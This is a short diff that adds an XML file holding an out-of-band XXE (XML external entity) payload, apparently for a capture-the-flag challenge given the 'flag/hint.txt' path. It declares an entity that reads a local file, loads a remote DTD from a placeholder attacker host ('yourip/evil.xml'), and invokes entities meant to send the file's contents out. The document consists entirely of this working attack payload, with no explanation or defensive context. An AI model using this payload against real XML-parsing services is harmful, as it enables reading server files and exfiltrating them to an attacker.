@@ -1,0 +1,8 @@
+<?xml version="1.0"?>  
+<!DOCTYPE ANY[  
+<!ENTITY % file SYSTEM "file:///flag/hint.txt">  
+<!ENTITY % remote SYSTEM "http://yourip/evil.xml">  
+%remote;  
+ %all;  
+%send;  
+]> 
